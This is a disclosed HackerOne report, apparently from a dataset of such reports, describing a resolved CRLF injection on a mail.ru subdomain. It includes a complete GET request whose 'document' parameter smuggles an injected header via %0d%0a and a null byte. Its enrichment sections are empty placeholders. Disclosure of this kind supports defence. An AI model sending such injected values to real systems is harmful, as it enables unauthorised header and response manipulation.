---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '99268'
original_report_id: '99268'
title: '[otus.p.mail.ru] CRLF Injection'
weakness: Information Disclosure
team_handle: mailru
created_at: '2015-11-12T11:39:58.780Z'
disclosed_at: '2017-03-03T13:15:11.558Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- information-disclosure
---

# [otus.p.mail.ru] CRLF Injection

## Metadata

- HackerOne Report ID: 99268
- Weakness: Information Disclosure
- Program: mailru
- Disclosed At: 2017-03-03T13:15:11.558Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Давно не попадались на ваших серверах.

Пример запроса:

GET /brat/ajax.cgi?action=downloadFile&collection=/&detailed=True&dir=True&extension=xml&filters=content::content_reference::omission::distortion::nonsense::inexact::unclear::content_cohesion::ThemeRheme::logic::content_pragmatics::register::use::&protocol=1&document=%0d%0aCRLF_Vulnerabled:true%00 HTTP/1.1
Host: otus.p.mail.ru

Если не использовать нулл-байт в переменной document, то инжектируемый хэдэр пример вид true.xml

Поэтому для корректного инжекта необходим такой суффикс в виду нулл-байта.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
